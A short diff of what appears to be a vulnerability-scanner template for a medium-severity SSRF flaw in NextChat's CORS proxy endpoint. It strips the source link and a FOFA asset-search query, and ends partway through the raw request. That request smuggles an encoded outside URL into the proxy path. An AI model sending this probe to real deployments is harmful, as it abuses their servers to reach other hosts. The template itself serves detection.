@@ -3,12 +3,8 @@ info:
   name: NextChat cors SSRF 漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rewyot83nzuk2cvv'
+  description: ''
   tags: ssrf,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rewyot83nzuk2cvv
-    fofa: title="NextChat"
 http:
 - raw:
   - 'GET /api/cors/http:%2f%2fnextchat.www.baidu.com%23 HTTP/1.1
